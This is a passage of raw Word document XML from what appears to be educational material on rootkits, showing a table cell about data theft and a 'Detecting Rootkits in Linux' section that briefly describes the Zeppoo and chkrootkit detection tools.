              <w:top w:val="single" w:sz="1" w:space="0" w:color="000000"/>
              <w:left w:val="single" w:sz="1" w:space="0" w:color="000000"/>
              <w:bottom w:val="single" w:sz="1" w:space="0" w:color="000000"/>
              <w:right w:val="single" w:sz="1" w:space="0" w:color="000000"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="002B3236">
            <w:pPr>
              <w:spacing w:before="27"/>
              <w:ind w:left="31"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Is </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>m</w:t>
            </w:r>
            <w:r>
              <w:t>ea</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="2"/>
              </w:rPr>
              <w:t>n</w:t>
            </w:r>
            <w:r>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t xml:space="preserve"> t</w:t>
            </w:r>
            <w:r>
              <w:t>o cause</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="1"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>pr</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>i</w:t>
            </w:r>
            <w:r>
              <w:t>vac</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="2"/>
              </w:rPr>
              <w:t>y</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:r>
              <w:t>da</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:t>a</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="1"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:t>heft</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="6" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>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29"/>
        <w:ind w:left="120" w:right="6693"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Detect</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ng Rootk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">ts </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>n L</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>nux:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="120" w:right="911"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>here</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>are var</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ous </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o de</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>ct</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nux and so</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hese are</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>ed be</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ow-</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="120" w:right="75"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Z</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ppoo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">– </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Z</w:t>
      </w:r>
      <w:r>
        <w:t>eppoo a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ows</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">you </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o de</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>ct roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>386 and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>x86_64 arch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ure</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>under</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Li</w:t>
      </w:r>
      <w:r>
        <w:t>nux,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>de</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>de</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:t>oreover</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>can</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>so de</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ect</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>dden</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>asks,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>connec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ons, corrup</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ed </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>ys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ca</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s and so </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>any o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>her</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ngs.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="120" w:right="62"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>hk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>oot</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>–</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>chkroo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ool </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>oca</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>ck</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>for</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>It</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="7"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l scr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>pt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hat checks sys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>em</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>ar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>es for roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> m</w:t>
      </w:r>
      <w:r>
        <w:t>od</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on. It</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>can a</w:t>
      </w:r>
      <w:r>
